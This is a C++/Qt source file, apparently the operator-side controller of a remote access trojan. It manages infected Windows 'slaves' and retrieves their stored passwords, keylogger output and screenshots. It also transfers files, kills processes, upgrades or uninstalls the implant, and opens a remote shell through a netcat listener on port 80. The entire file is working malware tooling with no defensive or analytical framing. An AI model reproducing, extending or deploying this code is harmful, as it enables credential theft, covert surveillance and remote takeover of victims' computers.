#include <QThread>
#include <QWaitCondition>
#include <QTextStream>
#include <QMessageBox>

#include "Slave.hpp"

#include <log/Log.hpp>
#include <system/File.hpp>
#include <common/Innocence.hpp>
using namespace Blaspheme;

#include <string>
using namespace std;

namespace Master
{
    QWaitCondition stream_associated;
    QMutex stream_mutex;

    class RemoteShellController : public QThread
    {
        public:
            void run()
            {
                system("nc.exe -l -p 80");
            }
    };
    
	Slave::Slave(Blaspheme::Session _session, QObject * parent)
		:session(_session), QObject(parent)
	{
		status = tr("Online");
		updateSlaveName();
		updateSystemVersion();
		updatePasswords();
		updateLogicalVolumes();
	}

    void Slave::disconnect()
    {
		LOG << "Resetting connexions";
		session.reset();
		status = tr("Deconnected");
	}

    QString Slave::getRemoteSystemVersion()
    {
        try
        {
            session << GET_WINDOWS_VERSION;
            string buffer;
            session >> buffer;
            return QString(buffer.c_str());
        }
        catch(Common::Exception&)
        {
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unknown exception";
            emit disconnected();
        }
		return "Undefined OS Version";
    }

	QStandardItemModel& Slave::getRemoteFileTree()
	{
		return remote_files;
	}

	QStringList& Slave::getStoredPasswords()
	{
		return stored_passwords;
	}

	void Slave::addStream(Network::TcpClient new_stream)
	{
		session.pushStream(new_stream);
	}

	Blaspheme::SessionId Slave::getUniqueId()
	{
		return session.getId();
	}

    QString Slave::getIp()
	{
		return session.stream().getIp().c_str();
	}

    QString Slave::getPort()
	{
		return QString::number(session.stream().getPort());
	}

    QString Slave::getStatus()
	{
		return status;
	}

    QString Slave::getName()
	{
		return name;
	}

    QString Slave::getSystemVersion()
	{
		return system_version;
	}

    const QString& Slave::getKeylog()
	{
		return current_keylog;
	}

    QPixmap& Slave::getScreen()
	{
		return screen;
	}

	QStringList& Slave::getProcessList()
	{
		return processes;
	}

    void Slave::updateProcessList()
    {
        try
        {
            session << GET_PROCESSLIST;
            string buffer;
            processes.clear();
            for(;;)
            {
                session >> buffer;
                if(buffer == FINISHED)
                {
                    break;
                }
                processes << buffer.c_str();
            }
            processes.sort();
        }
        catch(Common::Exception&)
        {
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unknown exception";
            emit disconnected();
        }
    }

    void Slave::killProcess(QString process)
    {
        try
        {
            session << KILL_PROCESS;
            session << process.toStdString();

            string buffer;
            session >> buffer;
            if(buffer == FAILURE)
            {
                LOG << "Unable to kill process " + process.toStdString();
            }
            else
            {
                updateProcessList();
            }
        }
        catch(Common::Exception&)
        {
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unknown exception";
            emit disconnected();
        }
    }

    void Slave::remoteShell()
    {
        try
        {
            // on verifie si netcat existe :
            ifstream netcat(Common::SHELL_PROGRAM, std::ios::binary);
            if(!netcat)
            {
                LOG << "NetCat program does not exist";
            }
            else
            {
                emit remoteShellState(true);
                session << REMOTE_SHELL;
				RemoteShellController shell;
				shell.start();
				shell.wait();
                emit remoteShellState(false);
            }
        }
		catch(Common::Exception&)
        {
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unknown exception";
            emit disconnected();
        }
    }

    void Slave::updateScreen(int quality, QProgressBar * bar)
    {
        try
        {
            session << GET_SCREEN;
            LOG << "Quality : " + Common::toString(quality);
            session << Common::toString(quality);
            string buffer_photo;
            InMemoryDownload download(buffer_photo, session.stream());
            download.addObserver(new GraphicProgressBar(bar));
			download.launch();
			LOG << "Image size : " + Common::toString(buffer_photo.size());
			if(screen.loadFromData((const unsigned char *)buffer_photo.c_str(), buffer_photo.size()))
			{
				LOG << "Loading OK";
			}
			else
			{
				LOG << "Unable to load image";
			}
			LOG << "Image format : " + Common::toString(screen.width()) + "x" + Common::toString(screen.height());
		}
		catch(Common::Exception&)
        {
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unknown exception";
            emit disconnected();
        }
    }

    void Slave::remoteShutdown()
    {
        try
        {
            session << SHUTDOWN;
        }
        catch(Common::Exception&)
        {
        }
        CATCH_UNKNOWN_EXCEPTION
        emit disconnected();
    }

    void Slave::remoteReboot()
    {
        try
        {
            session << REBOOT;
        }
        catch(Common::Exception&)
        {
        }
        CATCH_UNKNOWN_EXCEPTION
		emit disconnected();
    }

    void Slave::remoteLogout()
    {
        try
        {
            session << LOGOUT;
        }
        catch(Common::Exception&)
        {
        }
        CATCH_UNKNOWN_EXCEPTION
        emit disconnected();
    }

    void Slave::remoteHibernate()
    {
        try
        {
            session << HIBERNATE;
        }
        catch(Common::Exception&)
        {
        }
        CATCH_UNKNOWN_EXCEPTION
        emit disconnected();
    }

    void Slave::reboot()
    {
        try
        {
            session << REBOOT_CLIENT;
        }
        catch(Common::Exception&)
        {
        }
        CATCH_UNKNOWN_EXCEPTION
        emit disconnected();
    }

    void Slave::shutdown()
    {
        try
        {
            session << KILL_CLIENT;
        }
        catch(Common::Exception&)
        {
        }
        CATCH_UNKNOWN_EXCEPTION
        emit disconnected();
    }

    void Slave::upgrade(QString server_filename, QProgressBar * bar)
    {
        try
        {
            session << UPGRADE_CLIENT;
            
            string answer;
            session >> answer;
            
            if(answer == SUCCESS)
            {
                Upload upload(server_filename.toStdString(), session.stream());
                upload.launch();
                //reboot();
                QMessageBox::information(0, tr("Update"), tr("Slave was updated. Reboot slave for modifications to take effect"));
            }
            else
            {
                LOG << "Unable to update slave";
                QMessageBox::critical(0, tr("Problem"), tr("Unable to update slave"));
            }
        }
        catch(Common::Exception&)
        {
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unknown exception";
            emit disconnected();
        }
    }

    void Slave::uninstall()
    {
        try
        {
            session << UNINSTALL_CLIENT;
        }
        CATCH_UNKNOWN_EXCEPTION
        emit disconnected();
    }

    void Slave::updateKeylog(QProgressBar * bar)
    {
        remove(Common::LOG_PATH_DOWNLOAD);
        try
        {
            string answer;
            
            session << GET_LOGFILE;
            session >> answer;
            if(answer == KEYLOG_EMPTY)
            {
                current_keylog = "Log file empty";
                return;
            }
            
            string keylog_buffer;
            InMemoryDownload download(keylog_buffer, session.stream());
            download.addObserver(new GraphicProgressBar(bar));
            download.launch();
            current_keylog.clear();
            current_keylog.append(keylog_buffer.c_str());
        }
        catch(TransferException& e)
        {
            LOG << e.what();
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unknown exception";
            emit disconnected();
        }
    }

    QStandardItemModel& Slave::updateLogicalVolumes()
    {
        try
        {
            LOG << "Updating root drives started";
            remote_files.clear();
            
            session << BROWSE_FILES;
            session << "\\";
            string logical_volume;

            for(;;)
            {
                session >> logical_volume;
                if(logical_volume == FINISHED)
                {
                    break;
                }
                
                QStandardItem * item = new QStandardItem(QString(logical_volume.c_str()));
                item->setIcon(iprov.icon(QFileIconProvider::Drive));
                remote_files.appendRow(item);
            }
            LOG << "Updating root drives ended";
        }
        catch(exception& e)
        {
            QMessageBox::information(0, "TheSleeper", e.what());
            disconnect();
        }
        catch(...)
        {
            QMessageBox::information(0, "TheSleeper",tr("Unknown error"));
        }
		return remote_files;
    }

    bool Slave::browseFiles(QModelIndex currentIndex)
    {
        try
        {
            QString file = remote_files.data(currentIndex).toString();
            if(!file.size())
                return true;

            // si c'est un fichier qui a été selectionné, ne rien faire
            if(file[file.size()-1] != '\\')
            {
                LOG << "Directory is not selected";
                return true;
            }
            
            // c'est un dossier mais a-t-il déja été listé ?
            if(remote_files.hasChildren(currentIndex))
            {
                LOG << "Directory is already lin list";
                return true;
            }
            
            QString path = getRemotePath(currentIndex);
            LOG << "Directory to list : " + path.toStdString();
            
            session << BROWSE_FILES;
            session << path.toStdString();
            string listing;
            
            QStandardItem * current_item = remote_files.itemFromIndex(currentIndex);
            QList<QStandardItem *> item_list;
            
            while(true)
            {
                session >> listing;
				LOG << "Listing received : " + listing;
                if(listing == FAILURE)
                {
                    LOG << "Unable to list the directory";
                    return false;
                }
                if(listing == FINISHED)
                {
                    break;
                }
                QStandardItem * item = new QStandardItem(QString(listing.c_str()));
    
                // on detecte si c'est un repertoire en regardant le dernier caractere du fichier
                // s'il y a un slash, alors c'est un repertoire et donc on met a l'item l'icone
                // associé à un repertoire
                if(listing[listing.size()-1] == '\\')
                {
                    item->setIcon(iprov.icon(QFileIconProvider::Folder));
                }
                else
                {
                    item->setIcon(iprov.icon(QFileIconProvider::File));
                }
                item_list.push_back(item);
            }
            current_item->insertRows(0, item_list);
        }
        catch(exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unkown exception";
            emit disconnected();
        }
		return true;
    }

    QString Slave::getRemotePath(QModelIndex currentIndex)
    {
        QModelIndex current = currentIndex;
        QString path;
        while(current != QModelIndex())
        {
            path.push_front(remote_files.data(current).toString());
            current = current.parent();
        }
        return path;
    }

    void Slave::startDownload(QString& source, QString& destination, QProgressBar * bar)
    {
        try
        {
            LOG << "Source : " + source.toStdString() + " , destination : " + destination.toStdString();
            session << START_DOWNLOAD;
            session << source.toStdString();
            Download transfer(destination.toStdString(), session.stream());
            transfer.addObserver(new GraphicProgressBar(bar));
            transfer.launch();
        }
        catch(std::exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unkown exception";
            emit disconnected();
        }
    }

    void Slave::startUpload(QString& source, QString& destination, QProgressBar * bar)
    {
        try
        {
            LOG << "Source : "+source.toStdString()+ " , destination : " + destination.toStdString();
            session << START_UPLOAD;
			session << destination.toStdString();
            
            Upload transfer(source.toStdString(), session.stream());
            transfer.addObserver(new GraphicProgressBar(bar));
            transfer.launch();
		}
        catch(std::exception& e)
        {
            LOG << e.what();
            emit disconnected();
        }
        catch(...)
        {
            LOG << "Unknown exception";
            emit disconnected();
        }
    }

	void Slave::updateSystemVersion()
	{
		session << GET_WINDOWS_VERSION;
		string buffer;
		session >> buffer;
		system_version = buffer.c_str();
		LOG << "Operating System version : " + buffer;
	}

	void Slave::updateSlaveName()
	{
		session << GET_CLIENT_NAME;        
		LOG << "Waiting for slave name";
		string buffer;
		session >> buffer;
		name = buffer.c_str();
		LOG << "Slave name : " + buffer;
	}

	void Slave::updatePasswords()
	{
		session << PASSWORDS_GETALL;
		LOG << "Waiting for passwords";
		string buffer;
		session >> buffer;
		if(buffer == FINISHED)
		{
			return;
		}
		LOG << "Passwords : " + buffer;
		// on decoupe la chaine a l'aide du delimiteur
		std::istringstream iss(buffer);
		string cred;
		while ( std::getline( iss, cred, ',' ) )
		{
			stored_passwords << cred.c_str();
		}		
	}

} // Master
